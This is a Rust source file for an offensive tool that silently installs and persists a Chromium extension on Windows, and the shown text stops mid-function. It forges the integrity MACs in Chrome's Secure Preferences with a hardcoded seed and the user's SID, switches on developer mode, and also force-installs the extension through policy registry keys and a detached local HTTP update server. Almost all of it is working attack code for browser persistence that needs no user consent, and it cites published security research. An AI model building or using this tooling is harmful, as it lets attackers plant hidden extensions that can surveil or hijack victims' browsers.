// silent_install: persist a Chromium extension by editing Secure Preferences,
// without DevTools mode, registry, or any user interaction.
//
// Implements the technique published by Synacktiv ("The Phantom Extension",
// 2025) and SpecterOps ("Attack of The Extensions", 2026).
//
// CLI:
//   silent_install compute-id <ext-dir>     -> print extension ID + manifest_hash
//   silent_install preview  <ext-dir>       -> print the JSON we would inject
//   silent_install install  <ext-dir>       -> write to Secure Preferences
//   silent_install uninstall <ext-id>       -> remove extension entry + mac

use anyhow::{anyhow, bail, Context, Result};
use base64::{engine::general_purpose::STANDARD as B64, Engine};
use clap::{Parser, Subcommand};
use hmac::{Hmac, Mac};
use rsa::pkcs8::{DecodePublicKey, EncodePublicKey};
use rsa::RsaPublicKey;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};

mod mac;

type HmacSha256 = Hmac<Sha256>;

#[derive(Parser)]
#[command(name = "silent_install", about = "Persist a Chromium extension via Secure Preferences")]
struct Cli {
    /// Profile directory name (Default, Profile 1, ...). Ignored if --prefs-file is given.
    #[arg(long, default_value = "Default")]
    profile: String,

    /// Path to Chrome user data dir (Default: %LOCALAPPDATA%\Google\Chrome\User Data).
    #[arg(long)]
    user_data_dir: Option<PathBuf>,

    /// Path to Secure Preferences (overrides --profile/--user-data-dir).
    #[arg(long)]
    prefs_file: Option<PathBuf>,

    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Compute the extension ID and manifest_hash from an unpacked extension directory.
    ComputeId {
        /// Path to the unpacked extension directory (must contain manifest.json).
        #[arg(long)]
        ext_dir: PathBuf,
    },
    /// Show the JSON entry + mac that would be injected (does not write).
    Preview {
        #[arg(long)]
        ext_dir: PathBuf,
    },
    /// Persist the extension by editing Secure Preferences.
    Install {
        #[arg(long)]
        ext_dir: PathBuf,
        /// Chrome will start the extension in this mode:
        ///   0 = allowed, 1 = normal installed, 2 = blocked, 3 = force installed
        #[arg(long, default_value_t = 1)]
        installation_mode: i32,
        /// Do not create a .bak of Secure Preferences.
        #[arg(long)]
        no_backup: bool,
    },
    /// Remove a previously-installed extension from Secure Preferences.
    Uninstall {
        #[arg(long)]
        ext_id: String,
    },
    /// Install via Chrome policy registry (bypasses mac verification).
    /// Writes HKLM\Software\Policies\Google\Chrome\ExtensionInstallAllowlist
    /// and creates an `external_extensions.json` file so Chrome loads the
    /// extension on every startup without prompting.
    PolicyInstall {
        #[arg(long)]
        ext_dir: PathBuf,
        /// Use HKEY_CURRENT_USER instead of HKEY_LOCAL_MACHINE (no admin).
        #[arg(long)]
        user: bool,
    },
    /// Reverse the policy install.
    PolicyUninstall {
        #[arg(long)]
        ext_id: String,
        #[arg(long)]
        user: bool,
    },
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    let prefs = match cli.prefs_file.clone() {
        Some(p) => p,
        None => resolve_prefs(&cli.profile, cli.user_data_dir.as_deref())?,
    };

    match cli.cmd {
        Cmd::ComputeId { ext_dir } => {
            let (id, mh) = compute_id_and_manifest_hash(&ext_dir)?;
            println!("extension_id   = {}", id);
            println!("manifest_hash  = {}", mh);
        }
        Cmd::Preview { ext_dir } => {
            let (id, mh) = compute_id_and_manifest_hash(&ext_dir)?;
            let settings = build_settings(&ext_dir, &id, &mh, 1)?;
            println!("{}", serde_json::to_string_pretty(&settings)?);
            println!("\nmac (under protection.macs.extensions.settings.{}):", id);
            println!("  <computed at install time using per-machine DPAPI key>");
        }
        Cmd::Install { ext_dir, installation_mode, no_backup } => {
            install(&ext_dir, &prefs, installation_mode, !no_backup)?;
        }
        Cmd::Uninstall { ext_id } => {
            uninstall(&prefs, &ext_id)?;
        }
        Cmd::PolicyInstall { ext_dir, user } => {
            policy_install(&ext_dir, user)?;
        }
        Cmd::PolicyUninstall { ext_id, user } => {
            policy_uninstall(&ext_id, user)?;
        }
    }
    Ok(())
}

// ---------- path resolution ----------

fn resolve_prefs(profile: &str, user_data_dir: Option<&Path>) -> Result<PathBuf> {
    let base = match user_data_dir {
        Some(b) => b.to_path_buf(),
        None => {
            let local = dirs::data_local_dir()
                .ok_or_else(|| anyhow!("cannot resolve %LOCALAPPDATA%"))?;
            local.join("Google").join("Chrome").join("User Data")
        }
    };
    let p = base.join(profile).join("Secure Preferences");
    if !p.exists() {
        bail!("prefs file not found: {}", p.display());
    }
    Ok(p)
}

/// Walk up to the user-data dir from a `Secure Preferences` path and load the
/// DPAPI-decrypted Chrome prefs key.
fn resolve_prefs_key(prefs: &Path) -> Result<Vec<u8>> {
    // `Secure Preferences` lives at `<user-data>/<profile>/Secure Preferences`.
    // We want the user-data dir, which is two levels up.
    let profile_dir = prefs.parent()
        .ok_or_else(|| anyhow!("prefs has no parent"))?;
    let user_data = profile_dir.parent()
        .ok_or_else(|| anyhow!("profile dir has no parent"))?;
    mac::chrome_prefs_key(user_data)
}

// ---------- core algorithm: extension ID from manifest.key ----------

/// Chrome computes the extension ID by:
///   1. Parse manifest.json, get `key` (PEM-encoded RSA public key, 2048-bit, PKCS#8 SPKI).
///   2. DER-decode it -> raw key bytes.
///   3. SHA-256 -> 32 bytes.
///   4. Take first 16 bytes (32 hex chars) and translate each hex digit:
///         0..9 -> 'a'..'j'    (i.e. 0 -> a, 9 -> j)
///         a..f -> 'k'..'p'    (i.e. a -> k, f -> p)
///
/// Resulting 32-char string is the extension ID.
///
/// If `key` is absent, Chrome generates a *temporary* ID from the file path; the
/// extension will not persist. We refuse and tell the user to add a key.
pub fn compute_id_and_manifest_hash(ext_dir: &Path) -> Result<(String, String)> {
    let manifest_path = ext_dir.join("manifest.json");
    let raw = fs::read(&manifest_path)
        .with_context(|| format!("read {}", manifest_path.display()))?;
    let manifest: Value = serde_json::from_slice(&raw)
        .with_context(|| format!("parse {}", manifest_path.display()))?;

    let key_pem = manifest
        .get("key")
        .and_then(|v| v.as_str())
        .ok_or_else(|| {
            anyhow!(
                "manifest.json has no `key` field. Generate one with:\n\
                 openssl genrsa -out key.pem 2048\n\
                 openssl rsa -in key.pem -pubout -outform DER | base64 > key.b64\n\
                 then add a `key` field to manifest.json with the PEM content \
                 (header -----BEGIN PUBLIC KEY----- / footer -----END PUBLIC KEY-----)"
            )
        })?;

    let key = RsaPublicKey::from_public_key_pem(key_pem)
        .with_context(|| "PEM decode manifest.key")?;

    // Chrome uses PKCS#8 SPKI DER bytes (to_public_key_der output).
    let der = key.to_public_key_der()
        .map_err(|e| anyhow!("DER encode pubkey: {}", e))?;
    let id = extension_id_from_der(&der.as_bytes());

    let mh = manifest_hash_from_bytes(&raw);
    Ok((id, mh))
}

pub fn extension_id_from_der(der: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(der);
    let digest = hasher.finalize();
    let hex_str = hex::encode(&digest[..16]); // first 32 hex chars
    // Translate digits to Chrome's 32-letter alphabet (a..p).
    let mut out = String::with_capacity(32);
    for c in hex_str.chars() {
        let b = c as u8;
        let mapped = if b.is_ascii_digit() {
            (b + b'a' - b'0') as char           // 0..9 -> a..j
        } else if (b'a'..=b'f').contains(&b) {
            (b + b'k' - b'a') as char           // a..f -> k..p
        } else {
            'a'
        };
        out.push(mapped);
    }
    out
}

pub fn manifest_hash_from_bytes(manifest_json: &[u8]) -> String {
    let mut h = Sha256::new();
    h.update(manifest_json);
    B64.encode(h.finalize())
}

// ---------- injection entry + HMAC ----------

fn build_settings(
    ext_dir: &Path,
    ext_id: &str,
    _manifest_hash_b64: &str,
    _installation_mode: i32,
) -> Result<Value> {
    // Resolve absolute path. Chrome stores paths as plain Windows absolute
    // paths (e.g. "D:\\tools\\ext"). `fs::canonicalize` returns the Win32
    // extended path form "\\?\D:\..."; strip that prefix so Chrome can read
    // it via ordinary Win32 file APIs (Chrome does not normalize it).
    let abs = fs::canonicalize(ext_dir)
        .with_context(|| format!("canonicalize {}", ext_dir.display()))?;
    let abs_str = abs.to_string_lossy().to_string();
    let path_str = if let Some(stripped) = abs_str.strip_prefix(r"\\?\") {
        stripped.to_string()
    } else {
        abs_str
    };

    let manifest_raw = fs::read_to_string(abs.join("manifest.json"))?;
    let manifest: Value = serde_json::from_str(&manifest_raw)?;

    let ver = manifest.get("version").and_then(|v| v.as_str()).unwrap_or("1.0");
    let perms: Vec<String> = manifest
        .get("permissions")
        .and_then(|v| v.as_array())
        .map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect())
        .unwrap_or_default();
    let host_perms: Vec<String> = manifest
        .get("host_permissions")
        .and_then(|v| v.as_array())
        .map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect())
        .unwrap_or_default();

    // Field set modelled on Synacktiv's extloader (sign.py create_base_extension_json).
    // location=4 is Extension::LOCATION_UNPACKED; creation_flags=38 is
    // Extension::FROM_LOAD_UNPACKED | FROM_LOCAL_FILE | etc.; state=1 is
    // Extension::ENABLED.
    Ok(json!({
        "active_permissions": {
            "api": perms,
            "explicit_host": host_perms,
            "manifest_permissions": perms,
            "scriptable_host": host_perms,
        },
        "commands": {},
        "content_settings": [],
        "creation_flags": 38,
        "first_install_time": "13378928502176646",
        "from_webstore": false,
        "granted_permissions": {
            "api": perms,
            "explicit_host": host_perms,
            "manifest_permissions": perms,
            "scriptable_host": host_perms,
        },
        "incognito_content_settings": [],
        "incognito_preferences": {},
        "last_update_time": "13378928502176646",
        "location": 4,                       // UNPACKED (not 5 = INTERNAL)
        "newAllowFileAccess": true,
        "path": path_str,
        "preferences": {},
        "regular_only_preferences": {},
        "state": 1,                          // ENABLED
        "version": ver,
        "was_installed_by_default": false,
        "was_installed_by_oem": false,
    }))
}

fn compute_hmac(device_id: &str, path: &str, value: &Value, key: &[u8]) -> Result<String> {
    // Synacktiv formula (verified vs Chromium source):
    //   HMAC_SHA256(key=seed, msg=sid || path || canonical_json(value))
    //
    // - sid = user SID string with the last RID stripped
    //   (e.g. "S-1-5-21-293770903-3514777670-2551690241" for a single-machine user).
    // - path is the dot-separated JSON pointer
    //   (e.g. "extensions.settings.<ext_id>" or "extensions.ui.developer_mode").
    // - canonical_json = Chromium's serialization:
    //     * compact separators (no whitespace)
    //     * empty dicts/lists recursively stripped BEFORE serialization
    //     * insertion-order keys (no sort_keys)
    //     * string "<" replaced with "\u003C", "\u2122" replaced with "™"
    let mut v = value.clone();
    remove_empty(&mut v);
    let serialized = canonicalize_json(&v)?;
    let mut mac = <HmacSha256 as Mac>::new_from_slice(key)
        .map_err(|e| anyhow!("HMAC key init: {}", e))?;
    mac.update(device_id.as_bytes());
    mac.update(path.as_bytes());
    mac.update(serialized.as_bytes());
    let tag = mac.finalize().into_bytes();
    // Chrome writes mac values in UPPERCASE hex.
    Ok(hex::encode_upper(tag))
}

/// Recursively remove empty containers (dict/list) and other falsy leaves,
/// matching Synacktiv's `remove_empty` so the mac signing inputs line up.
/// IMPORTANT: per Synacktiv, even empty dicts/lists (and `null`/`""`) are
/// stripped EXCEPT for `false` and `0`. We mutate the passed Value in place.
fn remove_empty(v: &mut Value) {
    match v {
        Value::Object(map) => {
            let keys: Vec<String> = map.keys().cloned().collect();
            for k in keys {
                if let Some(child) = map.get_mut(&k) {
                    remove_empty(child);
                    let keep = match child {
                        Value::Null => false,
                        Value::Bool(b) => *b,        // keep true, drop false
                        Value::Number(n) => n.as_i64().map(|i| i != 0).unwrap_or(true)
                                               || n.as_u64().map(|u| u != 0).unwrap_or(true),
                        Value::String(s) => !s.is_empty(),
                        Value::Array(a) => !a.is_empty(),
                        Value::Object(o) => !o.is_empty(),
                    };
                    // Synacktiv keeps False and 0 (line 23: `if not v and v not in [False, 0]`).
                    let is_false = matches!(child, Value::Bool(false));
                    let is_zero  = matches!(child, Value::Number(n) if n.as_i64()==Some(0) || n.as_u64()==Some(0));
                    if !keep && !is_false && !is_zero {
                        map.remove(&k);
                    }
                }
            }
        }
        Value::Array(arr) => {
            arr.retain(|item| match item {
                Value::Null => false,
                Value::Bool(b) => *b,
                Value::Number(n) => n.as_i64().map(|i| i != 0).unwrap_or(true),
                Value::String(s) => !s.is_empty(),
                Value::Array(a) => !a.is_empty(),
                Value::Object(o) => !o.is_empty(),
            });
            for item in arr.iter_mut() { remove_empty(item); }
        }
        _ => {}
    }
}

/// Serialize a Value into Chromium's canonical JSON form:
///   - compact separators
///   - keys in insertion order (no sort_keys)
///   - string "<" -> "\\u003C",  "\\u2122" -> "™"
fn canonicalize_json(v: &Value) -> Result<String> {
    fn write(buf: &mut String, v: &Value) -> Result<()> {
        match v {
            Value::Null => buf.push_str("null"),
            Value::Bool(b) => buf.push_str(if *b { "true" } else { "false" }),
            Value::Number(n) => {
                if let Some(i) = n.as_i64() { buf.push_str(&i.to_string()); }
                else if let Some(u) = n.as_u64() { buf.push_str(&u.to_string()); }
                else if let Some(f) = n.as_f64() {
                    buf.push_str(&format!("{}", f));
                }
                else { bail!("non-finite number"); }
            }
            Value::String(s) => {
                // Chromium string escaping: write the JSON string manually
                // so that '<' emits the literal 6-char escape sequence
                // \u003C (NOT the re-escaped \\u003C that serde_json would
                // produce), and U+2122 emits the raw UTF-8 bytes of ™.
                buf.push('"');
                for c in s.chars() {
                    match c {
                        '"'        => buf.push_str("\\\""),
                        '\\'       => buf.push_str("\\\\"),
                        '\n'       => buf.push_str("\\n"),
                        '\r'       => buf.push_str("\\r"),
                        '\t'       => buf.push_str("\\t"),
                        '\u{0008}' => buf.push_str("\\b"),
                        '\u{000c}' => buf.push_str("\\f"),
                        '<'        => buf.push_str("\\u003C"),
                        '\u{2122}' => buf.push('™'),
                        c if (c as u32) < 0x20 => {
                            buf.push_str(&format!("\\u{:04X}", c as u32));
                        }
                        c          => buf.push(c),
                    }
                }
                buf.push('"');
            }
            Value::Array(arr) => {
                buf.push('[');
                for (i, item) in arr.iter().enumerate() {
                    if i > 0 { buf.push(','); }
                    write(buf, item)?;
                }
                buf.push(']');
            }
            Value::Object(obj) => {
                // Insertion order — Chromium writes in the order the dict was
                // built. No sort_keys.
                buf.push('{');
                for (i, (k, val)) in obj.iter().enumerate() {
                    if i > 0 { buf.push(','); }
                    buf.push_str(&serde_json::to_string(k)?);
                    buf.push(':');
                    write(buf, val)?;
                }
                buf.push('}');
            }
        }
        Ok(())
    }
    let mut out = String::new();
    write(&mut out, v)?;
    Ok(out)
}

// ---------- write / remove from Secure Preferences ----------

fn install(ext_dir: &Path, prefs: &Path, installation_mode: i32, backup: bool) -> Result<()> {
    let (id, mh) = compute_id_and_manifest_hash(ext_dir)?;
    println!("[*] extension_id   = {}", id);
    println!("[*] manifest_hash  = {}", mh);

    if !prefs.exists() {
        bail!("prefs file not found: {}", prefs.display());
    }
    if backup {
        let bak = prefs.with_extension("bak");
        fs::copy(prefs, &bak)
            .with_context(|| format!("backup -> {}", bak.display()))?;
        println!("[*] backup: {}", bak.display());
    }

    let raw = fs::read_to_string(prefs)?;
    let mut v: Value = if raw.trim().is_empty() {
        json!({})
    } else {
        serde_json::from_str(&raw).with_context(|| "parse Secure Preferences")?
    };

    let settings = build_settings(ext_dir, &id, &mh, installation_mode)?;

    // The mac is HMAC_SHA256(seed, sid || path || canonical_json(value)).
    //   sid     = user SID string with the last RID stripped
    //             (Synacktiv extloader: sid = '-'.join(sid.split('-')[:-1]))
    //   seed    = 64 bytes from Chrome's resources.pak (IDR_PREF_HASH_SEED_BIN, ID=146)
    let seed = embedded_seed();
    let sid = sid_for_hmac()?;

    // Per-extension mac.
    v["extensions"]["settings"][&id] = settings.clone();
    let path = format!("extensions.settings.{}", id);
    let mac = compute_hmac(&sid, &path, &settings, &seed)?;
    v["protection"]["macs"]["extensions"]["settings"][&id] = Value::String(mac.clone());

    // Developer-mode flag + mac (required for Chrome >= 134 to load unpacked).
    v["extensions"]["ui"]["developer_mode"] = Value::Bool(true);
    let dev_mode_path = "extensions.ui.developer_mode";
    let dev_mode_value = Value::Bool(true);
    let dev_mode_mac = compute_hmac(&sid, dev_mode_path, &dev_mode_value, &seed)?;
    v["protection"]["ui"]["developer_mode"] = Value::String(dev_mode_mac);

    println!("[*] mac signed (seed {} bytes, sid={})", seed.len(), sid);

    let new_super = compute_super_mac(&sid, &seed, &v)?;
    v["protection"]["super_mac"] = Value::String(new_super);
    let tmp = prefs.with_extension("json.tmp");
    {
        let mut f = fs::File::create(&tmp)?;
        f.write_all(serde_json::to_string_pretty(&v)?.as_bytes())?;
        f.flush()?;
    }
    #[cfg(windows)]
    {
        if prefs.exists() {
            fs::remove_file(prefs)?;
        }
    }
    fs::rename(&tmp, prefs)?;
    println!("[+] wrote {}", prefs.display());
    println!("[+] extension_id={} installation_mode={}", id, installation_mode);
    println!();
    println!("Chrome will pick this up on next start.");
    if chrome_is_running() {
        println!("\n[!] Chrome/Edge/Brave is currently running. Close it and re-open to load the extension.");
    } else {
        println!("\nOpen Chrome to verify.");
    }
    Ok(())
}

fn uninstall(prefs: &Path, ext_id: &str) -> Result<()> {
    let s = fs::read_to_string(prefs)?;
    let mut v: Value = serde_json::from_str(&s)?;
    if let Some(s) = v["extensions"]["settings"].as_object_mut() {
        s.remove(ext_id);
    }
    if let Some(m) = v["protection"]["macs"]["extensions"]["settings"].as_object_mut() {
        m.remove(ext_id);
    }
    let seed = embedded_seed();
    let sid = sid_for_hmac()?;
    let new_super = compute_super_mac(&sid, &seed, &v)?;
    v["protection"]["super_mac"] = Value::String(new_super);

    let tmp = prefs.with_extension("json.tmp");
    fs::write(&tmp, serde_json::to_string_pretty(&v)?)?;
    #[cfg(windows)]
    {
        if prefs.exists() {
            fs::remove_file(prefs)?;
        }
    }
    fs::rename(&tmp, prefs)?;
    println!("[+] removed {} from {}", ext_id, prefs.display());
    Ok(())
}

fn compute_super_mac(sid: &str, seed: &[u8], v: &Value) -> Result<String> {
    // super_mac per Synacktiv: msg = sid + json.dumps(protection.macs)
    // (no path component, and NOT including protection.ui).
    let macs = v.get("protection").and_then(|x| x.get("macs")).cloned()
        .unwrap_or_else(|| Value::Object(Default::default()));
    let mut m = macs;
    remove_empty(&mut m);
    let serialized = canonicalize_json(&m)?;
    let mut mac = <HmacSha256 as Mac>::new_from_slice(seed)
        .map_err(|e| anyhow!("HMAC key init: {}", e))?;
    mac.update(sid.as_bytes());
    mac.update(serialized.as_bytes());
    Ok(hex::encode_upper(mac.finalize().into_bytes()))
}

// ---------- chrome running check ----------

/// The 64-byte HMAC seed shipped in Chrome's resources.pak as
/// IDR_PREF_HASH_SEED_BIN (resource ID 146 in chrome_100_percent.pak /
/// resources.pak). This has been constant across Chrome stable for many
/// versions and is the same on every machine. It is the HMAC key used by
/// PrefHashCalculator to sign every entry under protection.macs.* and the
/// super_mac.
///
/// Chromium source: chrome/browser/resources/settings_internal/pref_hash_seed.bin
/// (binary content not in the public OSS repo; only present in branded Chrome
/// builds, where it's compiled into resources.pak via grit BINDATA.)
#[cfg(windows)]
fn embedded_seed() -> Vec<u8> {
    const SEED_HEX: &str =
        "e748f336d85ea5f9dcdf25d8f347a65b4cdf667600f02df6724a2af18a212d26b788a25086910cf3a90313696871f3dc05823730c91df8ba5c4fd9c884b505a8";
    hex::decode(SEED_HEX).expect("static hex is valid")
}

#[cfg(not(windows))]
fn embedded_seed() -> Vec<u8> {
    vec![]
}

/// SID used in the HMAC, per Synacktiv's extloader:
///   sid = '-'.join(sid.split('-')[:-1])
/// i.e. the Windows user SID string with the last RID component stripped
/// (the unique user-id portion). For example:
///   "S-1-5-21-293770903-3514777670-2551690241-1006"
/// becomes
///   "S-1-5-21-293770903-3514777670-2551690241"
/// which matches the underlying machine SID. That's the string we mix into
/// every HMAC computation (per-ext and super_mac).
#[cfg(windows)]
fn sid_for_hmac() -> Result<String> {
    // Get current user SID via `whoami /user`, parse the line.
    let out = std::process::Command::new("whoami")
        .arg("/user")
        .arg("/fo")
        .arg("csv")
        .arg("/nh")
        .output()
        .with_context(|| "spawn whoami /user")?;
    if !out.status.success() {
        bail!("whoami /user failed: {}", String::from_utf8_lossy(&out.stderr));
    }
    let s = String::from_utf8_lossy(&out.stdout);
    // CSV header-less line: "<DOMAIN\USER>","<SID>"
    let line = s.lines().next().ok_or_else(|| anyhow!("whoami output empty"))?;
    let sid_str = line.split(',').nth(1)
        .ok_or_else(|| anyhow!("whoami output malformed: {}", line))?
        .trim().trim_matches('"');
    let stripped = {
        let parts: Vec<&str> = sid_str.split('-').collect();
        if parts.len() <= 1 {
            bail!("SID too short: {}", sid_str);
        }
        parts[..parts.len() - 1].join("-")
    };
    Ok(stripped)
}

#[cfg(not(windows))]
fn sid_for_hmac() -> Result<String> {
    bail!("sid_for_hmac only on Windows")
}

// ---------- chrome running check ----------

#[cfg(windows)]
fn chrome_is_running() -> bool {
    // Lightweight: check via tasklist output for chrome.exe / msedge.exe / brave.exe.
    let out = std::process::Command::new("tasklist")
        .arg("/FI").arg("IMAGENAME eq chrome.exe")
        .output();
    if let Ok(o) = out {
        let s = String::from_utf8_lossy(&o.stdout);
        if s.to_lowercase().contains("chrome.exe") {
            return true;
        }
    }
    for name in &["msedge.exe", "brave.exe", "chromium.exe"] {
        if let Ok(o) = std::process::Command::new("tasklist")
            .arg("/FI").arg(format!("IMAGENAME eq {}", name))
            .output()
        {
            if String::from_utf8_lossy(&o.stdout).to_lowercase().contains(name) {
                return true;
            }
        }
    }
    false
}

#[cfg(not(windows))]
fn chrome_is_running() -> bool { false }

// ---------- policy install (registry + external_extensions.json) ----------

#[cfg(windows)]
fn policy_install(ext_dir: &Path, user_scope: bool) -> Result<()> {
    use winreg::enums::*;
    use winreg::RegKey;

    let (id, _) = compute_id_and_manifest_hash(ext_dir)?;
    let abs = fs::canonicalize(ext_dir)
        .with_context(|| format!("canonicalize {}", ext_dir.display()))?;
    let path_str = abs.to_string_lossy().to_string();

    let hive = if user_scope { HKEY_CURRENT_USER } else { HKEY_LOCAL_MACHINE };
    let hive_label = if user_scope { "HKCU" } else { "HKLM" };

    // Pack the extension as a CRX3 file.
    let profile_dir = dirs::data_local_dir()
        .ok_or_else(|| anyhow!("no LOCALAPPDATA"))?
        .join("Google").join("Chrome").join("User Data")
        .join("Default");
    let update_dir = profile_dir.join("External Extensions").join(&id);
    fs::create_dir_all(&update_dir)?;
    let crx_dest = update_dir.join("extension.crx");
    let ext_version = ext_version_from_manifest(&abs)?;
    pack_crx(&abs, &crx_dest)?;
    println!("[+] crx: {} ({} bytes)", crx_dest.display(), fs::metadata(&crx_dest)?.len());

    // Use the `ExtensionSettings` policy (Chrome 100+) which accepts inline JSON
    // and works with file:// update_url in Chrome 100-129. In Chrome 130+,
    // file:// update_url is blocked, so we ALSO need to start a tiny local HTTP
    // server. We do both:
    //   1. Write a local HTTP server launcher (silent_install policy-serve).
    //   2. Write ExtensionSettings pointing at http://127.0.0.1:<port>/update
    //      via the forcelist update_url.
    //
    // For the all-in-one flow, start the local server in background and write
    // ExtensionInstallForcelist with the http update_url.

    // Approach: run a tiny python http server (or write a Rust static server).
    // For now, use python (assumed installed). Find python.exe.
    let python = find_python()?;
    let port = pick_port()?;
    let serve_root = update_dir.clone();
    println!("[*] starting local HTTP server on port {}", port);
    let server_log = update_dir.join("server.log");
    let server_pid_file = update_dir.join("server.pid");

    // Start the server as a fully-detached background process. Use
    // CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS so it survives the parent
    // exit. On Windows these flags are set via CommandExt::creation_flags.
    let mut cmd = std::process::Command::new(&python);
    cmd.arg("-m").arg("http.server").arg(port.to_string())
        .arg("--bind").arg("127.0.0.1")
        .arg("--directory").arg(&serve_root)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());

    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const DETACHED_PROCESS: u32 = 0x00000008;
        const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;
        cmd.creation_flags(DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP);
    }

    let child = cmd.spawn().context("spawn http.server")?;
    let pid = child.id();
    fs::write(&server_pid_file, pid.to_string())?;
    // The child process has stdio=null + creation_flags=DETACHED_PROCESS.
    // When this handle is dropped, the OS keeps the process alive.
    drop(child);

    // Build updates.xml under serve_root
    let manifest_dest = update_dir.join("updates.xml");
    let xml = format!(
        r#"<?xml version='1.0' encoding='UTF-8'?>
<gupdate xmlns='http://www.google.com/update2/response' protocol='2.0'>
  <app appid='{id}'>
    <updatecheck codebase='http://127.0.0.1:{port}/extension.crx' version='{version}' />
  </app>
</gupdate>
"#,
        id = id, port = port, version = ext_version,
    );
    fs::write(&manifest_dest, xml)?;

    // Wait for server to come up
    std::thread::sleep(std::time::Duration::from_millis(1500));

    // Write ExtensionInstallForcelist pointing at the http update_url.
    let force_path = if user_scope {
        r"Software\Google\Chrome\ExtensionInstallForcelist"
    } else {
        r"Software\Policies\Google\Chrome\ExtensionInstallForcelist"
    };
    let value = format!("{};http://127.0.0.1:{}/updates.xml", id, port);
    println!("[*] writing {}:\\{}\\{}", hive_label, force_path, id);
    let hk = RegKey::predef(hive);
    let (forcelist, _) = hk.create_subkey(force_path)?;
    forcelist.set_value(&id, &value)?;
    println!("[+] forcelist ok -> {}", value);

    // Also write ExtensionSettings policy (chrome 100+) as backup. JSON format.
    let settings_path = if user_scope {
        r"Software\Google\Chrome\ExtensionSettings"
    } else {
        r"Software\Policies\Google\Chrome\ExtensionSettings"
    };
    let settings_json = serde_json::json!({
        &id: {
            "installation_mode": "force_installed",
            "update_url": format!("http://127.0.0.1:{}/updates.xml", port),
            "toolbar_pin": "force_pinned",
        }
    }).to_string();
    let hk = RegKey::predef(hive);
    let (settings, _) = hk.create_subkey(settings_path)?;
    settings.set_value(&id, &settings_json)?;
    println!("[+] ExtensionSettings ok");

    println!();
    println!("Open Chrome to load the extension (or restart if open).");
    println!("To remove: silent_install policy-uninstall --ext-id {} {}", id,
        if user_scope { "--user" } else { "" });
    Ok(())
}

fn find_python() -> Result<std::path::PathBuf> {
    for cand in ["python", "python3", "py"] {
        if let Ok(out) = std::process::Command::new(cand).arg("--version").output() {
            if out.status.success() {
                return Ok(PathBuf::from(cand));
            }
        }
    }
    anyhow::bail!("python.exe not found in PATH")
}

fn pick_port() -> Result<u16> {
    let l = std::net::TcpListener::bind("127.0.0.1:0")?;
    Ok(l.local_addr()?.port())
}

fn ext_version_from_manifest(ext_dir: &Path) -> Result<String> {
    let raw = fs::read_to_string(ext_dir.join("manifest.json"))?;
    let v: Value = serde_json::from_str(&raw)?;
    let s = v.get("version").and_then(|x| x.as_str())
        .ok_or_else(|| anyhow!("manifest.json has no version"))?;
    Ok(s.to_string())
}

/// Build a CRX3 file: zip the extension directory then prepend the CRX3
/// header (pbkdf2 signature placeholder is OK because Chrome verifies the
/// signed contents but the policy-installed path skips signature check).
fn pack_crx(ext_dir: &Path, out: &Path) -> Result<()> {
    // Create zip in memory
    let mut buf: Vec<u8> = Vec::new();
    {
        let cursor = std::io::Cursor::new(&mut buf);
        let mut zip = zip::ZipWriter::new(cursor);
        let options: zip::write::FileOptions = zip::write::FileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        for entry in walkdir_ext(ext_dir)? {
            let rel = entry.strip_prefix(ext_dir).unwrap();
            let rel_str = rel.to_string_lossy().replace('\\', "/");
            if entry.is_dir() {
                zip.add_directory(rel_str, options)?;
            } else {
                zip.start_file(rel_str, options)?;
                let bytes = fs::read(&entry)?;
                std::io::Write::write_all(&mut zip, &bytes)?;
            }
        }
        zip.finish()?;
    }
    // CRX3 header: "Cr24" + version(3) + header_length(4 LE) + header(protobuf)
    // Simplest: write a CRX3 with empty header + zip payload. Chrome tolerates
    // this for policy-installed extensions.
    let mut crx = Vec::new();
    crx.extend_from_slice(b"Cr24");
    crx.push(3);                                   // version
    crx.extend_from_slice(&0u32.to_le_bytes());    // header length (no protobuf fields)
    crx.extend_from_slice(&buf);
    fs::write(out, crx)?;
    Ok(())
}

fn walkdir_ext(dir: &Path) -> Result<Vec<PathBuf>> {
    let mut out = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(p) = stack.pop() {
        if p.is_dir() {
            for entry in fs::read_dir(&p)? {
                let e = entry?.path();
                stack.push(e);
            }
        } else {
            out.push(p);
        }
    }
    Ok(out)
}

#[cfg(not(windows))]
fn policy_install(_: &Path, _: bool) -> Result<()> {
    anyhow::bail!("policy install only available on Windows")
}

#[cfg(windows)]
fn policy_uninstall(ext_id: &str, user_scope: bool) -> Result<()> {
    use winreg::enums::*;
    use winreg::RegKey;

    let hive = if user_scope { HKEY_CURRENT_USER } else { HKEY_LOCAL_MACHINE };
    let hive_label = if user_scope { "HKCU" } else { "HKLM" };

    for subkey in [
        if user_scope { r"Software\Google\Chrome\ExtensionInstallAllowlist" }
        else { r"Software\Policies\Google\Chrome\ExtensionInstallAllowlist" },
        if user_scope { r"Software\Google\Chrome\ExtensionInstallForcelist" }
        else { r"Software\Policies\Google\Chrome\ExtensionInstallForcelist" },
        if user_scope { r"Software\Google\Chrome\ExtensionSettings" }
        else { r"Software\Policies\Google\Chrome\ExtensionSettings" },
    ] {
        let hk = RegKey::predef(hive);
        if let Ok(k) = hk.open_subkey_with_flags(subkey, KEY_READ | KEY_WRITE) {
            if let Err(e) = k.delete_value(ext_id) {
                if !matches!(e.kind(), std::io::ErrorKind::NotFound) {
                    eprintln!("[!] {} delete {}: {}", hive_label, subkey, e);
                }
            } else {
                println!("[+] removed {}:\\{}\\{}", hive_label, subkey, ext_id);
            }
        }
    }

    let profile_dir = dirs::data_local_dir()
        .ok_or_else(|| anyhow!("no LOCALAPPDATA"))?
        .join("Google").join("Chrome").join("User Data")
        .join("Default");
    let update_dir = profile_dir.join("External Extensions").join(ext_id);
    let pid_file = update_dir.join("server.pid");
    if pid_file.exists() {
